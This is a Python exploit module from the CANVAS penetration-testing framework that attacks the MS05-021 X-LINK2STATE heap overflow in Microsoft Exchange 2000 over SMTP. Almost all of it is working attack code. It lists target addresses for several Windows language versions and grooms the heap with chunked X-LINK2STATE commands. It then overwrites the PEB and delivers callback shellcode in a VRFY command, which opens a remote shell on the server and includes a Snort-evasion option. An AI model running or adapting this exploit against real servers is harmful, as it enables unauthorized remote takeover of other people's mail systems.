#! /usr/bin/env python
#Proprietary CANVAS source code - use only under the license agreement
#specified in LICENSE.txt in your CANVAS distribution
#Copyright Immunity, Inc, 2002-2006
#http://www.immunityinc.com/CANVAS/ for more information
#Part of CANVAS For licensing information, please refer to your
#Immunity CANVAS licensing documentation

import sys

if "." not in sys.path:
    sys.path.append(".")

from exploitutils import *
from tcpexploit import tcpexploit
import struct

# GUI info
NAME="MS Exchange 2000 MS05-021 X-LINK2STATE heap overflow"
DESCRIPTION="MS Exchange 2000 contains a heap overflow flaw when handling the XLINK2STATE command"
DOCUMENTATION={}
DOCUMENTATION['VENDOR']="Microsoft"
DOCUMENTATION["Notes"]="This exploit is reliable over and over again (assuming you have the language correct), but give Inetinfo a little while to\n boot up after you crash it. This is a callback exploit, so obviously you'll need to have the correct interface selected to callback, otherwise LSASS might crash."
DOCUMENTATION["CVE Name"] = "CVE-2005-0560"
DOCUMENTATION["CVE Url"] = "http://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2005-0560"
DOCUMENTATION['CVSS'] = 7.5

VERSION="0.1"

PROPERTY = {}
PROPERTY['TYPE'] = "Exploit"
PROPERTY['SITE'] = "Remote"
PROPERTY['ARCH'] = [ ["Windows" ] ]
PROPERTY['VERSION'] =  [ "2000" ]
PROPERTY['MSADV'] = "MS05-021"


CHANGELOG="""

"""

NOTES="""        
 http://www.faqs.org/rfcs/rfc1830.html

 
"""


class theexploit(tcpexploit):
    def __init__(self):
        tcpexploit.__init__(self)
        self.covertness = 0
        self.port = 25
        self.host = "10.10.10.7"
        self.localhost = "192.168.0.2"
        self.localport = 5555
        self.badstring = "\x00\r\n"
        self.name=NAME
        self.fromaddr="root@localhost"
        self.toaddr="root@localhost"
        self.chunks=[]
        self.timeout_var= 1
        self.trigger_only=0
        self.setVersions()
        return
    
    def neededListenerTypes(self):
        from canvasengine import WIN32MOSDEF
        return [WIN32MOSDEF]

    def setVersions(self):
        #to retarget this, just load up SMTPSVC.DLL in IDA,
        #search the strings for doVRFY, then the function that's in
        #will be referenced in a function table. The address in that
        #functiontable is what we're looking for.
        #there might be many function tables...pick one. It's probably the
        #one that ends in f4
        self.versions={}
        self.versions[0]=["Automatically determine version (English only)",0]
        self.versions[1]=["Windows 2000 English",0x6b5973f4]
        self.versions[2]=["Windows 2000 French",0x783973f4] 
        self.versions[3]=["Windows 2000 Russian",0x676D73f4]
        self.versions[4]=["Windows 2000 Chinese",0x6B5473F4]
        
        
    def createShellcode(self):
        host=self.callback.ip
        port=self.callback.port
        self.localhost=host
        self.localport=port
        self.shellcode = self.createHeapSafeInjectIntoProcess(self.badstring, host, port, smallcode=1)
        self.log("Length of shellcode is %s"%len(self.shellcode))
        return self.shellcode

    
    def test(self):
        self.host=self.target.interface
        self.port=int(self.argsDict.get("port",self.port))
        s=self.gettcpsock()
        try:
            s.connect((self.host,self.port))
        except:
            self.log("Could not connect")
            return 0
        
        s.sendall("EHLO server\r\n")
        #do two receives here
        try:
            data=s.recv(1000)
        except:
            data=""
        try:
            data+=s.recv(1000)
        except:
            #catch a timeout
            pass
        try:
            data+=s.recv(1000)
        except:
            #catch a timeout
            pass
        self.log("Test received %s"%prettyprint(data))
        if data.count("5.0.2195.6713"):
            self.log("Exchange found")
            if data.count("CHUNKING"):
                self.log("Does appear to support chunking")
                self.log("Setting version to English Windows 2000")
                self.version=1
                return 1
        return 0
        
    def recvdata(self,s):
        """
        Slow way to recv all the data we get sent by the remote side
        """
        data=[]
        while 1:
            try:
                newdata=s.recv(1000)
            except:
                newdata=""
        
            if newdata=="":
                break
            data+=[newdata]
        return "".join(data)
            
            
        
    def run(self):
        self.host=self.target.interface
        self.port=int(self.argsDict.get("port",self.port))
        self.trigger_only=int(self.argsDict.get("trigger_only",self.trigger_only))
        self.setInfo("%s attacking %s:%d - (in progress)"% (NAME, self.host, self.port), showlog=1)
        s=self.gettcpsock()
        s.set_timeout(self.timeout_var)
        try:
            s.connect((self.host, self.port))
        except socket.error:
            self.log("Connection failed - socket closed")
            return 0
        except timeoutsocket.Timeout:
            self.log("Connection failed - port firewalled")
            return 0
        
        try:
            ret=self.recvdata(s)
        except:
            self.log("Failed to recv data")
            return 0
        #self.log("Banner:: %s"%ret)

        if self.version==0:
            self.test()
            if self.version==0:
                self.log("Automatic test found a not vulnerable server?")
                self.setInfo("%s attacking %s:%d - (failed)"% (NAME, self.host, self.port), showlog=1)
                return 0
        s.sendall("EHLO localhost\r\n")
        ret=self.recvdata(s)
        self.log("Got banner: %s"%prettyprint(ret))
        try:
            s.sendall("QUIT\r\n")
            ret=self.recvdata(s)
            s.close()
        except:
            self.log("Cannot send QUIT")

        

        if not self.trigger_only:
            doVRFYptr=self.versions[self.version][1]
            PEBptr=0x7ffdf028
            what =  doVRFYptr
            #what =  0x41414141
            where = PEBptr #PEB is always the same
    
            for a in range(0, 2):
                self.AllocChunk('A' * (510*2))
            first=  self.AllocChunk("B" * 510)
            second= self.AllocChunk("C" * 510)
            third=  self.AllocChunk("D" * 510)
            for a in range(0, 3):
                self.AllocChunk('A' * (510*2))
            four= self.AllocChunk("b" * 20)
            five= self.AllocChunk("c" * 20)
            six=  self.AllocChunk("d" * 20)
            seven=  self.AllocChunk("B" * 510)
            eight= self.AllocChunk("C" * 510)
            nine=  self.AllocChunk("D" * 510)
            for a in range(0, 3):
                self.AllocChunk('A' * (510*2))
                
            #four= self.AllocChunk("D" * 510)
            #five= self.AllocChunk("E" * 510)
            #six=  self.AllocChunk("F" * 510)
            #for a in range(0, 3):
                #self.AllocChunk("A" * (510*2))
            self.FreeChunk(four)

            #print "FAROL"
            #raw_input()
    
            self.Overwrite(what, where)
            self.FreeChunk(six) 
            
            ###NUEVO:
            what =  PEBptr
            where = 0x7ffdc358 #our magic instruction

            self.FreeChunk(first)
        
            self.Overwrite(what, where)
            self.FreeChunk(third) 
            # NEW NEW
            what =  doVRFYptr
            where = PEBptr

            self.FreeChunk(seven)
    
    
            self.Overwrite(what, where)
            self.FreeChunk(nine) 
            
            
        #self.AllocChunk("A" * 512)
        s=self.gettcpsock()
        s.set_timeout(self.timeout_var)
        s.connect((self.host, self.port))
        ret=self.recvdata(s)
        s.sendall("HELO WORLD\r\n")
        ret=self.recvdata(s)
        DEBUG="\xcc"
        DEBUG=""
        self.log("Sending VRFY packet")
        if self.covertness>=11:
            snort_sendall(s,"VRFY ")
            s.sendall("\xff"+DEBUG+self.shellcode+"@yahoo.com\r\n")
        else:
            s.sendall("VRFY \xff"+DEBUG+self.shellcode+"@yahoo.com\r\n")
        self.log("VRFY Sent")
        #ret=self.recvdata(s)
        import time
        time.sleep(1)
        self.ISucceeded()
        time.sleep(5)
        self.ISucceeded()
        time.sleep(5)
        return self.ISucceeded()
    
    def Overwrite(self, what, where):
        s=self.gettcpsock()
        s.set_timeout(self.timeout_var)
        s.connect((self.host, self.port))
        ret=self.recvdata(s)
        #self.log("Banner:: %s"%ret)
        
        s.sendall("HELO localhost\r\n")
        ret=self.recvdata(s)

        self.log("Overwriting -> what/where: [0x%08x] = 0x%08x " % (what, where))
        what = struct.pack("<L", what)
        where = struct.pack("<L", where)
        
        #self.log("HELO Response: %s"%ret)

        attackstr="X-LINK2STATE CHUNK=%s\r\n"%("A"*512)
        s.sendall(attackstr)
        ret=self.recvdata(s)
        #self.log("X-LINK2STATE response: %s"%ret)

        attackstr="X-LINK2STATE CHUNK=%s\r\n"%("\x01\x01"+"Z"*510)
        s.sendall(attackstr)
        ret=self.recvdata(s)
        #self.log("X-LINK2STATE response: %s"%ret)
        #print "STOP?"
        #raw_input()
        
        s.sendall("X-LINK2STATE CHUNK=\x01\x01\x01\x01\x02\x02\x02\x02" + where+what+ "\r\n")
        ret=self.recvdata(s)
        #self.log("X-LINK2STATE response: %s"%ret)
        s.sendall("QUIT\r\n")
        ret=self.recvdata(s)
        #self.log("X-LINK2STATE response: %s"%ret)
        
        
    def bleh(self):
        
        
        #protocol packet (basically a nop)
        #only protocol 5 is supported
        #mystr2="PROTOCOL %x  "%(5)	
        #while in a Read() function ebx holds the main data structure, and you can watch 
        #it eat your string...
        #ebx+68h is important for ServerInfo, but initialized to 0 
        
                
        if 0:
            #ServerInfo packet
            #one of the 2 allowed as an init packet
            #all the "read" funtions return 1 on success, 0 on failure
            
            GUID="4"*32
            GUID2="5"*32
            version=5
            #last 
            #AL test at 610254d8
            bindata="A"*32
            lenbindata=len(bindata) #this gets shr, 1
    
            mystr2="SERVER_INFO %s %s %8.8x {%8.8x}%s "%(GUID,GUID2,version,lenbindata,bindata)

        if 0:
            #attach packet
            GUID="4"*32
            mystr2="ATTACH %s %s %s %s  "%(GUID,GUID,GUID,GUID)
            
        if 0:
            #DONE_RESPONSE, DIGEST_QUERY are the two allowed, it turns out
            mystr2="DONE_RESPONSE  "
            
        if 1:
            mystr3="A"*500
            mystr2="MULTI (5) ({%8.8x} %s )"%(-1,mystr3)
        #attachchange and serverinfo are the only packets that can be sent validly
        #at first!
        #+10 is because the {%8.8x} takes some space
        if 0:
            mystr="X-LINK2STATE LAST CHUNK={%8.8x} %s\r\n"%(len(mystr2),mystr2) 
            s.sendall(mystr)
            ret=self.recvdata(s)
            self.log("X-LINK2STATE response: %s"%ret)

        if 0:
            #FIRST CHUNK, chunk chunk, etc.
            #mystr2="A"*500
            mylen=len(mystr2)

            totaldata=mylen+900+900
            print "Length=%x"%(totaldata)
            mystr="X-LINK2STATE FIRST CHUNK %8.8x ={%8.8x} %s\r\n"%(totaldata,totaldata,mystr2) 

        """ ({7fffffff} DIGEST_QUERY "+"a"*32+")\r\n"""
        #s.sendall(mystr)
        #ret=self.recvdata(s)
        #self.log("X-LINK2STATE response: %s"%ret)
        #print "Paused"
        #raw_input()
        #ret=self.recvdata(s)
        #self.log("X-LINK2STATE response: %s"%ret)
        
        if 1:
            #FIRST CHUNK, chunk chunk, etc.
            mystr2="A"*900
            mystr="X-LINK2STATE CHUNK=%s\r\n"%(mystr2) 

        """ ({7fffffff} DIGEST_QUERY "+"a"*32+")\r\n"""
        print mystr
        s.sendall(mystr)
        ret=self.recvdata(s)
        self.log("X-LINK2STATE response: %s"%ret)
        print "Paused"
        raw_input()
        ret=self.recvdata(s)
        self.log("X-LINK2STATE response: %s"%ret)
        
        if 1:
            #FIRST CHUNK, chunk chunk, etc.
            mystr2="A"*900
            mystr="X-LINK2STATE LAST CHUNK=%s\r\n"%(mystr2) 

        """ ({7fffffff} DIGEST_QUERY "+"a"*32+")\r\n"""
        s.sendall(mystr)
        ret=self.recvdata(s)
        self.log("X-LINK2STATE response: %s"%ret)
        print "Paused"
        raw_input()
        ret=self.recvdata(s)
        self.log("X-LINK2STATE response: %s"%ret)
        
        
        return self.ISucceeded()
        
    def AllocChunk(self, buf):
        s=self.gettcpsock()
        s.set_timeout(self.timeout_var)
        s.connect((self.host, self.port))
        ret=self.recvdata(s)
        s.sendall("HELO localhost\r\n")
        ret=self.recvdata(s)
        for a in range(0, len(buf)/510):
            attackstr="X-LINK2STATE CHUNK= %s\r\n"% buf[a*512:a*512+512]
            s.sendall(attackstr)
            #ret=self.recvdata(s)
        self.chunks.append(s)
            
        idx=len(self.chunks) -1
        self.log("AllocChunk(0x400) = 0x%02x" % idx)
        
        return idx
        
        
    def FreeChunk(self, idx):
        s=self.chunks[idx]
        self.log("FreeChunk(0x%02x)" % idx)
        attackstr="X-LINK2STATE LAST CHUNK=%s\r\n"%("Z"*500)
        s.sendall(attackstr)
        ret=self.recvdata(s)
        s.sendall("QUIT\r\n")
        ret=self.recvdata(s)

    def doStageTwo(self, s):
        self.log("Got trigger!")
        from win32Node import win32Node
        node=win32Node()
        node.parentnode=self.argsDict["passednodes"][0]
        newshell = win32MosdefShellServer.win32shellserver(s,node,self.logfunction)
        node.startup()
        self.setInfo("%s attacking %s:%d - (succeeded!)" % (NAME, self.host, self.port), showlog=1)
        self.log("Thanks \\0/")
        return node

if __name__== '__main__':
    print "Running CANVAS %s Exploit v %s"%(DESCRIPTION,VERSION)
    app = theexploit()
    ret=standard_callback_commandline(app)
